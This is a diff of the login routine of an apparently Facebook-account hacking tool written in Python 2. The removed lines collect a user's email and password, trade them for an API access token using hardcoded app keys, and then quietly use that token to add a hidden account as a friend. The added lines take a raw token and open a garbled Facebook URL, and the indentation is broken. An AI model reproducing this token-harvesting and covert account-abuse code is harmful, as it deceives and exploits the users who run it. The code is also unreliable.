@@ -110,51 +110,52 @@ def login():
 		print logo
 		print 42*"\033[1;96m="
 		print('\033[1;96m[☆] \x1b[1;91mAPNA FACEBOOK ACCOUNT LOGIN KREIN \x1b[1;96m[☆]' )
-		id = raw_input('\033[1;96m[+] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
-		pwd = raw_input('\033[1;96m[+] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
-		tik()
-		try:
-			br.open('https://m.facebook.com')
-		except mechanize.URLError:
-			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
-			keluar()
-		br._factory.is_html = True
-		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
-		br.submit()
-		url = br.geturl()
-		if 'save-device' in url:
-			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
-				x=hashlib.new("md5")
-				x.update(sig)
-				a=x.hexdigest()
-				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
-				r=requests.get(url,params=data)
-				z=json.loads(r.text)
-				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
-				unikers.close()
-				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCKoxMkvX0kdfztguDxxe09w')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
-			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;91m[!] There is no internet connection"
-				keluar()
-		if 'checkpoint' in url:
-			print("\n\x1b[1;92m[!] Your Account is on Checkpoint")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			keluar()
-		else:
-			print("\n\x1b[1;93mPassword/Email is wrong")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			login()
+		print("[ login with token ]").center(50)
+
+	print("")
+
+        token = raw_input("[!] Token ? \033[0;90m")
+
+        token_s = open(".fb_token.txt","w")
+
+        token_s.write(token)
+
+        token_s.close()
+
+        try:
+
+            r = requests.get("https://graph.facebook.com/me?access_token="+token)
+
+            q = json.loads(r.text)
+
+            name = q["name"]
+
+            nm = name.rsplit(" ")[0]
+
+            print("")
+
+            print("\033[1;92mYour token login successfully").center(50)
+
+            time.sleep(1)
+
+	    os.system("xdg-open https://https://www.facebook.com/https://www.facebook.com/hassanzebyarhussain")
+	
+
+	    time.sleep(1)
+
+            menu()
+
+        except (KeyError , IOError):
+
+            print("")
+
+            print("\033[1;91mToken invalid or account has checkpoint\033[0;97m").center(50)
+
+            print("")
+
+            time.sleep(2)
+
+            login()
 
 
 def menu():
